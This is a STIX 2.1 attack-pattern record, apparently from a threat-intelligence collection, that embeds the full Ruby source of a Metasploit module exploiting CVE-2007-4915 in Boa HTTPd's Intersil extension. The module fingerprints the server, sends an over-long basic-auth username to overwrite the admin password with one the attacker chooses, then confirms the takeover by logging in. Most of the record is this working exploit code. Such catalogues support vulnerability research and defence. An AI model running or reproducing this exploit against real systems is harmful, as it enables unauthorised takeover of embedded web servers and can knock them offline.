{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--70d67020-c6b1-4946-b20a-0d1cf6367358",
    "created": "2024-08-14T16:24:03.861848Z",
    "modified": "2024-08-14T16:24:03.861851Z",
    "name": "Intersil (Boa) HTTPd Basic Authentication Password Reset",
    "description": " The Intersil extension in the Boa HTTP Server 0.93.x - 0.94.11 allows basic authentication bypass when the user string is greater than 127 bytes long.  The long string causes the password to be overwritten in memory, which enables the attacker to reset the password.  In addition, the malicious attempt also may cause a denial-of-service condition.  Please note that you must set the request URI to the directory that requires basic authentication in order to work properly. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/intersil_pass_reset.rb",
            "external_id": "intersil_pass_reset.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-4915"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Intersil (Boa) HTTPd Basic Authentication Password Reset',\n        'Description' => %q{\n          The Intersil extension in the Boa HTTP Server 0.93.x - 0.94.11\n          allows basic authentication bypass when the user string is greater\n          than 127 bytes long.  The long string causes the password to be\n          overwritten in memory, which enables the attacker to reset the\n          password.  In addition, the malicious attempt also may cause a\n          denial-of-service condition.\n\n          Please note that you must set the request URI to the directory that\n          requires basic authentication in order to work properly.\n        },\n        'Author' => [\n          'Luca \"ikki\" Carettoni <luca.carettoni[at]securenetwork.it>', # original discoverer\n          'Claudio \"paper\" Merloni <claudio.merloni[at]securenetwork.it>', # original discoverer\n          'Max Dietz <maxwell.r.dietz[at]gmail.com>' # metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2007-4915' ],\n          [ 'BID', '25676'],\n          [ 'PACKETSTORM', '59347']\n        ],\n        'DisclosureDate' => '2007-09-10'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The request URI', '/']),\n        OptString.new('PASSWORD', [true, 'The password to set', 'pass'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => '/',\n      'method' => 'GET'\n    })\n\n    if (res && (m = res.headers['Server'].match(%r{Boa/(.*)})))\n      vprint_status(\"Boa Version Detected: #{m[1]}\")\n      return Exploit::CheckCode::Safe if (m[1][0].ord - 48 > 0) # boa server wrong version\n      return Exploit::CheckCode::Safe if (m[1][3].ord - 48 > 4)\n\n      return Exploit::CheckCode::Vulnerable\n    else\n      vprint_status('Not a Boa Server!')\n      return Exploit::CheckCode::Safe # not a boa server\n    end\n  rescue Rex::ConnectionRefused\n    print_error('Connection refused by server.')\n    return Exploit::CheckCode::Safe\n  end\n\n  def run\n    return if check != Exploit::CheckCode::Vulnerable\n\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1, 1] != '/'\n\n    res = send_request_cgi({\n      'uri' => uri,\n      'method' => 'GET',\n      'authorization' => basic_auth(Rex::Text.rand_text_alpha(127), datastore['PASSWORD'])\n    })\n\n    if res.nil?\n      print_error('The server may be down')\n      return\n    elsif res && (res.code != 401)\n      print_status(\"#{uri} does not have basic authentication enabled\")\n      return\n    end\n\n    print_status('Server still operational. Checking to see if password has been overwritten')\n    res = send_request_cgi({\n      'uri' => uri,\n      'method' => 'GET',\n      'authorization' => basic_auth('admin', datastore['PASSWORD'])\n    })\n\n    if !res\n      print_error('Server timedout, will not continue')\n      return\n    end\n\n    case res.code\n    when 200\n      print_good(\"Password reset successful with admin:#{datastore['PASSWORD']}\")\n    when 401\n      print_error('Access forbidden. The password reset attempt did not work')\n    else\n      print_status(\"Unexpected response: Code #{res.code} encountered\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-09-10"
}